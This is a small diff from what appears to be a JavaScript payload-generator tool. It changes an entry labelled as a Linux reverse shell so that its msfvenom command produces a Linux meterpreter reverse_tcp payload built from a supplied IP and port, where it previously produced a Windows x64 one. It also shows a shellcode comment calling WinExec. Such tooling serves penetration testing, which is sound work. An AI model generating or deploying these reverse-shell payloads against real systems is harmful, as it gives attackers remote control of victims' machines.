@@ -538,7 +538,7 @@ call r14                    ; Call WinExec("calc.exe", SW_HIDE)`
                 },
                 comment : 'Linux/x86 反弹Shell',
                 code : (ip, port) => {
-                    return `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} --platform Windows -f raw`
+                    return `msfvenom -p linux/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f raw`
                 }
             }
         ]
